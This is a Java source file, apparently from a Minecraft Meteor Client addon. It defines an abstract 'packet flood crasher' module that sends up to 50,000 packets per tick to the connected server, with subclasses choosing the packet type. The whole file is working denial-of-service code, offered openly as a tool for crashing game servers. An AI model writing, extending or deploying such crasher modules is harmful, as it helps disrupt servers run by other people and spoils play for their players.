package com.haykkonen.lanyard.modules.crashers.flood;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Category;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.listener.ServerPlayPacketListener;
import net.minecraft.network.packet.Packet;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

import java.util.function.Supplier;

public abstract class AbstractPacketFloodCrasher<T extends ServerPlayPacketListener> extends Module {

    protected final SettingGroup sgGeneral = settings.getDefaultGroup();

    protected final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("The number of packets to send each tick.")
        .defaultValue(100)
        .min(1)
        .sliderMax(50000)
        .build()
    );

    protected AbstractPacketFloodCrasher(@NotNull Category category, @NotNull String name, @NotNull String description) {
        super(category, name, description);
    }

    @EventHandler
    private void onGameLeft(@NotNull GameLeftEvent event) {
        if (isActive()) {
            toggle();
        }
    }

    @EventHandler
    private void onTick(@NotNull TickEvent.Post event) {
        if (mc.player == null || mc.getNetworkHandler() == null) {
            return;
        }

        Supplier<Packet<T>> packetSupplier = createPacketSupplier();
        if (packetSupplier == null) {
            return;
        }

        final int packetAmount = amount.get();
        for (int i = 0; i < packetAmount; i++) {
            Packet<?> packet = packetSupplier.get();
            if (packet != null) {
                mc.getNetworkHandler().sendPacket(packet);
            }
        }
    }

    @Nullable
    protected abstract Supplier<Packet<T>> createPacketSupplier();
}
